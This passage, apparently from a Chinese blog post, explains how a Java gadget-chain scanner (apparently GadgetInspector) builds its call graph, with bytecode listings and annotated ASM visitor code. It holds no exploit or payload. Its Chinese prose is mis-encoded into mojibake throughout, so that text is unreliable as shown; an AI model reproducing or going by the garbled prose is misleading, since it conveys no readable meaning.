ï¼Œç”¨ç©ºè¡Œåˆ†éš”äº†ä¸Šé¢å››æ¡è¯­å¥çš„å­—èŠ‚ç ï¼Œå‡ºç°çš„å­—èŠ‚ç æŒ‡ä»¤åŒ…æ‹¬ï¼š<br>ldc ä»å¸¸é‡æ± åŠ è½½æ•°æ®åˆ°æ“ä½œæ•°æ ˆï¼Œastore ä»æ ˆé¡¶å¼¹å‡ºå¹¶å­˜å‚¨åˆ°æœ¬åœ°å˜é‡è¡¨ï¼Œaload ä»æœ¬åœ°å˜é‡è¡¨åŠ è½½æ•°æ®åˆ°æ“ä½œæ•°æ ˆï¼Œinvokestatic è°ƒç”¨ç±»æ–¹æ³•ï¼ˆé™æ€ï¼‰ï¼Œinvokevirtual è°ƒç”¨å®ä¾‹æ–¹æ³•ï¼Œreturn ä»å½“å‰æ–¹æ³•è¿”å› voidã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getValue</span><span class="params">(java.lang.Integer)</span>;</span><br><span class="line">  descriptor: (Ljava/lang/Integer;)V</span><br><span class="line">  flags: ACC_PUBLIC</span><br><span class="line">  Code:</span><br><span class="line">    stack=<span class="number">1</span>, locals=<span class="number">5</span>, args_size=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>: ldc           #<span class="number">5</span>                  <span class="comment">// String 100 å…¥æ ˆ</span></span><br><span class="line">       <span class="number">2</span>: astore_2                          <span class="comment">// å‡ºæ ˆ</span></span><br><span class="line"></span><br><span class="line">       <span class="number">3</span>: aload_2                           <span class="comment">// å…¥æ ˆï¼Œinvokestatic çš„å‚æ•°ï¼Œæ‰§è¡Œå®Œæ¯•åç»“æœå…¥æ ˆ</span></span><br><span class="line">       <span class="number">4</span>: invokestatic  #<span class="number">6</span>                  <span class="comment">// Method java/lang/Integer.parseInt:(Ljava/lang/String;)I</span></span><br><span class="line">       <span class="number">7</span>: invokestatic  #<span class="number">7</span>                  <span class="comment">// Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span></span><br><span class="line">      <span class="number">10</span>: astore_3                          <span class="comment">// å‡ºæ ˆï¼Œå­˜å‚¨æ‰§è¡Œç»“æœ</span></span><br><span class="line"></span><br><span class="line">      <span class="number">11</span>: aload_1                           <span class="comment">// å…¥æ ˆï¼Œå‚æ•° number</span></span><br><span class="line">      <span class="number">12</span>: astore_3                          <span class="comment">// å‡ºæ ˆ</span></span><br><span class="line"></span><br><span class="line">      <span class="number">13</span>: aload_3                           <span class="comment">// å…¥æ ˆï¼Œinvokevirtual çš„å‚æ•°</span></span><br><span class="line">      <span class="number">14</span>: invokevirtual #<span class="number">8</span>                  <span class="comment">// Method java/lang/Integer.toString:()Ljava/lang/String; æ‰§è¡Œå®Œæ¯•åç»“æœå…¥æ ˆ</span></span><br><span class="line">      <span class="number">17</span>: astore        <span class="number">4</span>                   <span class="comment">// å‡ºæ ˆ</span></span><br><span class="line">      <span class="number">19</span>: <span class="keyword">return</span>                            <span class="comment">// è¿”å› void</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">6</span>: <span class="number">0</span></span><br><span class="line">      line <span class="number">7</span>: <span class="number">3</span></span><br><span class="line">      line <span class="number">9</span>: <span class="number">11</span></span><br><span class="line">      line <span class="number">10</span>: <span class="number">13</span></span><br><span class="line">      line <span class="number">11</span>: <span class="number">19</span></span><br></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨æ–¹æ³•å‰ï¼Œè¿›è¡Œå‚æ•°çš„å…¥æ ˆï¼Œå³åˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œæ‰§è¡Œå®Œæ¯•åç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚å®é™…ä¸Šè¿™éƒ¨åˆ†çš„æ¨¡æ‹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œè¦è¯´æ±‡ç¼–è¯­è¨€å€’è¿˜ä¼šçœ‹ï¼Œä½†æ˜¯ Java å­—èŠ‚ç ä¹Ÿè¿˜æ²¡åˆ°é‚£ä¹ˆåº•å±‚ï¼Œæˆ‘çš„ç†è§£æ˜¯è°ƒç”¨å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼Œæ‰§è¡Œå®Œæ¯•åä»ç³»ç»Ÿæ ˆå¼¹å‡ºæ ˆå¸§ï¼Œé‚£ä¹ˆè¿”å›ç»“æœå­˜å…¥ä¸Šä¸€ä¸ªæ ˆå¸§çš„æ“ä½œæ•°æ ˆæ ˆé¡¶ï¼Ÿå›å¤´ç­‰æˆ‘ææ˜ç™½äº†å†è¡¥ä¸¤å¼ å›¾â€¦</p><h2 id="7-CallGraphDiscovery"><a href="#7-CallGraphDiscovery" class="headerlink" title="7. CallGraphDiscovery"></a>7. CallGraphDiscovery</h2><p><code>discover</code> æ–¹æ³•åˆ©ç”¨ä¹‹å‰å¾—åˆ°çš„ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿&#x2F;é‡å†™ä¿¡æ¯ã€æ•°æ®æµä¿¡æ¯ï¼Œç»“åˆ asm è®¿é—®è€…åˆ†æè¢«è°ƒæ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¼šè¢«è°ƒç”¨è€…æ–¹æ³•çš„å‚æ•°æ‰€å½±å“ã€‚</p><p>ä»¥ä¸‹é¢ getValue æ–¹æ³•ä¸ºä¾‹ï¼Œè°ƒç”¨äº† parseInt å’Œ toString ä¸¤ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯å‚æ•° number åªä¼šå½±å“åˆ° toStringã€‚å› æ­¤å¦‚æœæ±¡ç‚¹ï¼ˆæ”»å‡»è€…çš„è¾“å…¥æ•°æ®ï¼‰èµ°åˆ° getValue æ–¹æ³•ä¸”å‚æ•° number æ˜¯å¯æ§çš„ï¼ˆå³ä¸Šä¸€æ­¥åˆ†æèƒ½å¤Ÿä¼ é€’æ±¡æŸ“ï¼‰ï¼Œé‚£ä¹ˆè¿›ä¸€æ­¥åªéœ€è¦æ£€æŸ¥ toString æ–¹æ³•ï¼Œè€Œ parseInt æ–¹æ³•å°±ä¸ç”¨å†æ£€æŸ¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getValue</span><span class="params">(Integer number)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(s);</span><br><span class="line">    </span><br><span class="line">    n = number;</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> n.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> æ–¹æ³•çš„å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(CallGraphDiscovery.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨å…³ç³»ä¿¡æ¯ï¼šæ–¹æ³•æ‰€å±ç±»åï¼Œæ–¹æ³•åï¼Œæ–¹æ³•æè¿°ç¬¦ï¼Œè¢«è°ƒæ–¹æ³•æ‰€å±ç±»åï¼Œè¢«è°ƒæ–¹æ³•åï¼Œè¢«è°ƒæ–¹æ³•æè¿°ç¬¦ï¼Œæ–¹æ³•å‚æ•°ç´¢å¼•ï¼Œæ–¹æ³•å‚æ•°å¯¹è±¡çš„å­—æ®µåç§°ï¼Œè¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;GraphCall&gt; discoveredCalls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ†æè°ƒç”¨å…³ç³»ï¼Œå³è¢«è°ƒæ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¼šè¢«ï¼ˆè°ƒç”¨è€…ï¼‰æ–¹æ³•çš„å‚æ•°æ‰€å½±å“</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  é…ç½®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, GIConfig config)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯ï¼ˆinheritanceMapï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆï¼ŒsubClassMapï¼šçˆ¶ç±»-&gt;å­ç±»é›†åˆï¼‰</span></span><br><span class="line">    <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">    <span class="comment">// åŠ è½½æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    <span class="type">SerializableDecider</span> <span class="variable">serializableDecider</span> <span class="operator">=</span> config.getSerializableDecider(methodMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰çš„ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123; <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);   <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// åˆ¤æ–­è¢«è°ƒæ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¼šè¢«è°ƒç”¨è€…æ–¹æ³•çš„å‚æ•°æ‰€å½±å“</span></span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitMethod -&gt; visitOuterClass -&gt; visitInnerClass -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> <span class="title class_">ModelGeneratorClassVisitor</span>(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6),</span><br><span class="line">                        ClassReader.EXPAND_FRAMES);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorClassVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™äº†äº”ä¸ªè®¿é—®è€…æ–¹æ³•ï¼Œä¸»è¦å…³æ³¨ <code>visitMethod</code> ä¸­è°ƒç”¨ <code>ModelGeneratorMethodVisitor</code> å¯¹æ–¹æ³•è¿›è¡Œåˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">ModelGeneratorClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// æ•°æ®æµä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ModelGeneratorClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                      InheritanceMap inheritanceMap,</span></span><br><span class="line"><span class="params">                                      Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span><br><span class="line"><span class="params">                                      SerializableDecider serializableDecider, <span class="type">int</span> api)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(api); <span class="comment">// ASM API ç‰ˆæœ¬</span></span><br><span class="line">        <span class="built_in">this</span>.classMap = classMap;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="built_in">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;            <span class="comment">// ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> String signature;       <span class="comment">// ç­¾å</span></span><br><span class="line">    <span class="keyword">private</span> String superName;       <span class="comment">// çˆ¶ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> String[] interfaces;    <span class="comment">// æ¥å£</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature,</span></span><br><span class="line"><span class="params">                      String superName, String[] interfaces)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="comment">// è®°å½•ç±»çš„ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.signature = signature;</span><br><span class="line">        <span class="built_in">this</span>.superName = superName;</span><br><span class="line">        <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                     String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œè¿”å›æ–°çš„æ–¹æ³•è§‚å¯Ÿè€…</span></span><br><span class="line">        <span class="comment">// å¦‚æœç±»è§‚å¯Ÿè€…çš„ cv å˜é‡ä¸ºç©ºï¼Œåˆ™è¿”å› nullï¼Œå¦åˆ™è¿”å› cv.visitMethod</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ–¹æ³•è®¿é—®è€…ï¼Œåˆ¤æ–­æ–¹æ³•å‚æ•°ä¸è¢«è°ƒç”¨æ–¹æ³•å‚æ•°çš„ä¼ é€’å…³ç³»</span></span><br><span class="line">        <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰:visitCode -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        <span class="type">ModelGeneratorMethodVisitor</span> <span class="variable">modelGeneratorMethodVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelGeneratorMethodVisitor</span>(classMap,</span><br><span class="line">                inheritanceMap, passthroughDataflow, serializableDecider, api, mv, <span class="built_in">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="comment">// ç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span> &#123;   <span class="comment">// è®¿é—®ç±»çš„å¤–å›´ç±»ï¼ˆå¦‚æœæœ‰ï¼‰</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="built_in">super</span>.visitOuterClass(owner, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="type">int</span> access)</span> &#123;  <span class="comment">// è®¿é—®å†…éƒ¨ç±»ï¼Œè¯¥å†…éƒ¨ç±»ä¸ä¸€å®šæ˜¯è¢«è®¿é—®çš„ç±»çš„æˆå‘˜</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="built_in">super</span>.visitInnerClass(name, outerName, innerName, access);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorMethodVisitor</code> ä¹Ÿç»§æ‰¿äº† <code>TaintTrackingMethodVisitor</code> å®ç°ï¼Œä¸è¿‡åªé‡å†™äº†å…¶ä¸­çš„ 3 ä¸ªè®¿é—®è€…æ–¹æ³•</p><ul><li>visitCodeï¼šå¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®ï¼ŒæŠŠå‚æ•°å…¨éƒ¨å­˜åˆ°æœ¬åœ°å˜é‡è¡¨</li><li>visitFieldInsnï¼šè®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤</li><li>visitMethodInsnï¼šè®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</li></ul><p><code>visitCode</code> å’Œ PassthroughDataflowMethodVisitorï¼ˆç›´æ¥å­˜å‚¨å‚æ•°ç´¢å¼•ï¼‰ä¸­çš„å®ç°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯è¿™é‡Œå°† <code>arg</code> ä¸å‚æ•°ç´¢å¼•è¿›è¡Œæ‹¼æ¥ï¼Œå­˜å‚¨å­—ç¬¦ä¸²åˆ°æœ¬åœ°å˜é‡è¡¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;   <span class="comment">// å¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®</span></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitCode åˆå§‹åŒ–æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">    <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•å‚æ•°åˆ°æœ¬åœ°å˜é‡è¡¨ savedVariableState.localVars</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆéšå¼ï¼‰ä¸ºå¯¹è±¡å®ä¾‹ this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ arg å‰ç¼€æ¥è¡¨ç¤ºæ–¹æ³•å…¥å‚ï¼Œåç»­ç”¨äºåˆ¤æ–­æ˜¯å¦ä¸ºç›®æ ‡è°ƒç”¨æ–¹æ³•çš„å…¥å‚</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†å‚æ•°ï¼Œæ ¹æ®æè¿°ç¬¦å¾—å‡ºå‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> ä¹Ÿå’Œ PassthroughDataflowMethodVisitorï¼ˆç›´æ¥å­˜å‚¨å‚æ•°ç´¢å¼•ï¼‰ä¸­çš„å®ç°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯è¿™é‡Œå°†å­—æ®µåç§°ä¸ <code>argå‚æ•°ç´¢å¼•</code> å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åå­˜å‚¨åˆ°æ ˆé¡¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, 